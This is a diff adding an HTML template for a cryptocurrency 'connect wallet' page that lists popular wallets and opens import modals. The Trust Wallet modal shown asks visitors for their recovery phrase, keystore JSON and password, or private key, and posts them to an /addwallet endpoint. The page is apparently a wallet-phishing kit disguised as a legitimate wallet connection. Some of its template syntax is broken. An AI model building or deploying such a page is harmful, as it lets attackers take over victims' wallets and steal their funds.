+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>
+                        
+                        <div class="modal fade" id="trustwalletModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/trustwallet.png') }}" alt="">
+
+                                    
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="trustwallet">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>                         
+
+                        
+
+                    <div class="row justify-content-center items">
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#exampleModal">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/content/metamask.png') }}" alt="">
+                                    
+                                    <h4 class="mb-0">MetaMask</h4>
+                                    <p>A browser extension with great flexibility. The web's most popular wallet</p>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#authereumModal">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/content/authereum.png') }}" alt="">
+                                    
+                                    <h4 class="mb-0">Authereum</h4>
+                                    <p>A user-friendly wallet that allows you to sign up with your phone number on any device</p>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#walletconnectModal">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/walletconnect.png') }}" alt="">
+                                
+                                    <h4 class="mb-0">WalletConnect</h4>
+                                    <p>Pair with Trust, Argent, MetaMask & more. Works from any browser, without an extension</p>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#dapperModal">
+                                    <img class="avatar-md" src="{ url_for('static', path='public/assets/img/content/dapper.png ') }}" alt="">
+                                    
+                                    <h4 class="mb-0">Dapper</h4>
+                                    <p>A security-focused cloud wallet with pin codes and multi-factor authentication</p>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#kaikasModal">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/kaikas.png ') }}" alt="">
+                                    
+                                    <h4 class="mb-0">Kaikas</h4>
+                                    <p>A simple-to-use wallet that works on both mobile and through a browser extension</p>
+                                </a>
+                            </div>
+                        </div>
+
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#coinbaseModal">
+                                    <img class="avatar-md" src=".{{ url_for('static', path='public/assets/img/wallets/coinbase.png') }}" alt="">
+                                    
+                                    <h4 class="mb-0">Coinbase Wallet</h4>
+                                    <p>Support for hundreds of thousands of tokens and a whole world of dapps</p>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#phantomModal">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/phantom.png') }}" alt="">
+                                    
+                                    <h4 class="mb-0">Phantom (Solana)</h4>
+                                    <p>Phantom makes it safe & easy for you to store, buy, send, receive, swap tokens and collect NFTs on the Solana blockchain.</p>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#glowModal">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/glow.png') }}" alt="">
+
+                                    
+                                    
+                                    <h4 class="mb-0">Glow (Solana)</h4>
+                                    <p>Your new favorite Solana wallet awaits. Use Glow Wallet and your favorite Value Mints App on the go.</p>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#blockchainModal">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/blockchain.png') }}" alt="">
+                                    
+                                    <h4 class="mb-0">Blockchain Wallet</h4>
+                                    <p>he most trusted & secure crypto wallet to buy, store, collect NFTs, exchange & earn crypto. </p>
+                                </a>
+                            </div>
+                        </div>                        
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#trustwalletModal">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/trustwallet.png') }}" alt="">
+                                    
+                                    <h4 class="mb-0">Trustwallet (for mobile)</h4>
+                                    <p>The most trusted & secure crypto wallet to buy, store, collect NFTs, exchange & earn crypto. </p>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="col-12 col-md-6 col-lg-4 item">
+                            <!-- Single Wallet -->
+                            <div class="card single-wallet">
+                                <a class="d-block text-center" data-bs-toggle="modal" data-bs-target="#randomwalletModal">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/randomwallet.png') }}" alt="">
+                                    
+                                    <h4 class="mb-0">Other wallets</h4>
+                                    <p>Can't find your preferred wallet. Use optional wallet and your favorite Value Mints App on the go</p>
+                                </a>
+                            </div>
+                        </div>
+                        
+                    </div>
+                </div>
+            </section>
+            <!-- ***** Wallet Connect Area End ***** -->
+        </div>
+        <!-- ***** Page Wrapper End ***** -->
+
+ 
+ 
+<footer>
+        <!-- ***** Footer Nav Area Start ***** -->
+        <div id="footer" class="footer-nav-area">
+            <div class="container h-100 px-0">
+                <div class="netsea-footer-nav h-100">
+                    <ul class="d-flex justify-content-between align-items-center h-100 ps-0">
+                        <li class="active"><a href="https://demo8.codesremedy.com.ng/home"><i class="icon-home"></i>Home</a></li>
+                        <li><a href="https://demo8.codesremedy.com.ng/support"><i class="icon-support"></i>Support</a></li>
+                        <li><a href="https://demo8.codesremedy.com.ng/login"><i class="icon-wallet"></i>Wallet</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <!-- ***** Footer Nav Area End ***** -->
+</footer>        
+        
+    <!-- ***** All jQuery Plugins ***** -->
+
+    <!-- jQuery(necessary for all JavaScript plugins) -->
+    <script src="{{ url_for('static', path='public/assets/frontend/js/vendor/jquery.min.js') }}"></script>
+    
+
+    <!-- Bootstrap js -->
+    <script src="{{ url_for('static', path='public/assets/frontend/js/vendor/popper.min.js') }}"></script>
+    
+    <script src="{{ url_for('static', path='public/assets/frontend/js/vendor/bootstrap.min.js') }}"></script>
+    
+
+    <!-- Plugins js -->
+    <script src="{{ url_for('static', path='public/assets/frontend/js/vendor/all.min.js') }}"></script>
+
+    
+    <script src="{{ url_for('static', path='public/assets/frontend/js/vendor/slider.min.js') }}"></script>
+    <script src="{{ url_for('static', path='public/assets/frontend/js/vendor/countdown.min.js') }}"></script>
+    <script src="{{ url_for('static', path='public/assets/frontend/js/vendor/count-down.js') }}"></script>
+    <script src="{{ url_for('static', path='public/assets/frontend/js/vendor/shuffle.min.js') }}"></script>
+
+     <!-- Active js -->
+    <script src="{{ url_for('static', path='public/assets/frontend/js/main.js') }}"></script>
+    <script src=" {{ url_for('static', path='public/assets/frontend/js/pwa.js') }}"></script>
+    {{ url_for('static', path='https://cdnjs.cloudflare.com/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js ') }}
+    <script src="{{ url_for('static', path='public/assets/frontend/js/tab.js') }}"></script>
+    <script src="{{ url_for('static', path='public/assets/frontend/js/yieldmodal.js') }}"></script>
+    <script src="{{ url_for('static', path='public/assets/frontend/js/paycountdown.js') }}"></script>
+    <script src="{{ url_for('static', path='https://cdnjs.cloudflare.com/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js ') }}"></script> 
+
+    <script>
+
+        $(document).ready(function(){
+
+            $('img').lazyload();
+
+        });
+
+    </script>
+    
+
+
+
+
+
+</body></html>
